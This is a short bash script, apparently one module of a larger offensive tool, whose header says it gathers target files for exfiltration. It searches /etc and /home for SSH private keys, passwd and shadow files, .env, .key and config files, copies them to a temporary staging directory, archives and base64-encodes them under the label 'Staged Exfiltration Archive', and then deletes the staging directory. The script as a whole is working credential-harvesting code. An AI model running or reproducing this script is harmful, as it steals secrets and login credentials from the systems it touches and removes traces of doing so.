#!/bin/bash
# -----------------------------------------------------------------------------
# Collects, packages, and encodes target files and artifacts for exfiltration.
# -----------------------------------------------------------------------------

STAGING_DIR="$(mktemp_dir)"
[ -n "$STAGING_DIR" ] && [ -d "$STAGING_DIR" ] || exit 0

find /etc /home -maxdepth 3 -type f \( -name "*.conf" -o -name "*.config" -o -name "*.key" -o -name "id_rsa*" -o -name "id_ed25519*" -o -name "passwd" -o -name "shadow" -o -name "*.env" \) 2>/dev/null | head -n 30 | while IFS= read -r file; do
    [ -r "$file" ] || continue
    cp --parents "$file" "$STAGING_DIR/" 2>/dev/null || {
        safe_name="$(printf '%s' "$file" | sed 's|^/||; s|/|_|g')"
        cp "$file" "$STAGING_DIR/$safe_name" 2>/dev/null
    }
done

if [ -n "$(ls -A "$STAGING_DIR" 2>/dev/null)" ]; then
    archive_dir "$STAGING_DIR" | encode_b64 | label "Staged Exfiltration Archive"
fi

remove_file "$STAGING_DIR"
